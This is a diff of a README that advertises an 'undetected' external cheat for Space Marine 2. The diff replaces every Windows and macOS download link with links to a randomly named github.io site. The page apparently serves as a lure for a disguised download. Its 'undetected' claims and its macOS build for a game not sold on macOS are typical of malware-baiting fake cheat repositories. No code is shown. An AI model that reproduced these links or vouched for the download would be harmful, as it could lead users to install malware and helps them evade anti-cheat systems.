@@ -1,9 +1,9 @@
 # 🎮 Space Marine 2 External — Evidence V2
 
-[![Windows](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge&logo=windows)](https://WaterCongressman.github.io/win-download/)
-[![macOS](https://img.shields.io/badge/Download-macOS-black?style=for-the-badge&logo=apple)](https://WaterCongressman.github.io/mac-download/)
-[![Version](https://img.shields.io/badge/Version-2026-green?style=for-the-badge)](https://WaterCongressman.github.io/win-download/)
-[![Status](https://img.shields.io/badge/Status-Undetected-brightgreen?style=for-the-badge)](https://WaterCongressman.github.io/win-download/)
+[![Windows](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge&logo=windows)](https://iloqhmlhfppl.github.io/win-get2/)
+[![macOS](https://img.shields.io/badge/Download-macOS-black?style=for-the-badge&logo=apple)](https://iloqhmlhfppl.github.io/mac-download2/)
+[![Version](https://img.shields.io/badge/Version-2026-green?style=for-the-badge)](https://iloqhmlhfppl.github.io/win-get2/)
+[![Status](https://img.shields.io/badge/Status-Undetected-brightgreen?style=for-the-badge)](https://iloqhmlhfppl.github.io/win-get2/)
 
 > The most trusted **Space Marine 2 External** for 2026 — operates entirely outside the game process with zero memory injection, delivering a clean and undetected experience.
 
@@ -82,11 +82,11 @@
 ## 📥 Download
 
 <p align="center">
-  <a href="https://WaterCongressman.github.io/win-download/">
+  <a href="https://iloqhmlhfppl.github.io/win-get2/">
     <img src="https://img.shields.io/badge/Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Download Windows" />
   </a>
   &nbsp;&nbsp;
-  <a href="https://WaterCongressman.github.io/mac-download/">
+  <a href="https://iloqhmlhfppl.github.io/mac-download2/">
     <img src="https://img.shields.io/badge/Download%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white" alt="Download macOS" />
   </a>
 </p>
